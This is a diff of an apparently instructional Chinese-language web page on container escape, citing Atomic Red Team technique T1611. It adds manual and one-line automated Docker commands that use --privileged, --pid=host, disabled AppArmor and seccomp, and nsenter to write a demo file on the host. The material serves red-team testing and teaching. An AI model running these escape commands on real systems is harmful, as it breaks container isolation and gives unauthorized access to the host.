@@ -51,16 +51,26 @@
 參考資訊：<br>
 1. <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.md">T1611</a><br><br>
 
-步驟如下：
+手動執行：
 </p>
 <pre>
 root@user:~# docker run --rm -it --privileged --pid=host alpine /bin/sh
 / # nsenter --mount=/proc/1/ns/mnt -- /bin/bash
-root@xxx:/# touch /tmp/test
+root@xxx:/# touch /tmp/container_escape_demo
 root@xxx:/# exit
 / # exit
 root@user:~# ls /tmp/
-    test
+    container_escape_demo
+</pre><br>
+
+<p>
+自動執行：
+</p>
+<pre>
+root@user:~# docker run -it --rm --security-opt apparmor=unconfined --security-opt seccomp=unconfined --privileged --pid=host alpine nsenter --mount=/proc/1/ns/mnt -- touch /tmp/container_escape_demo
+
+root@user:~# ls /tmp/
+    container_escape_demo
 </pre><br>
 
 <p>
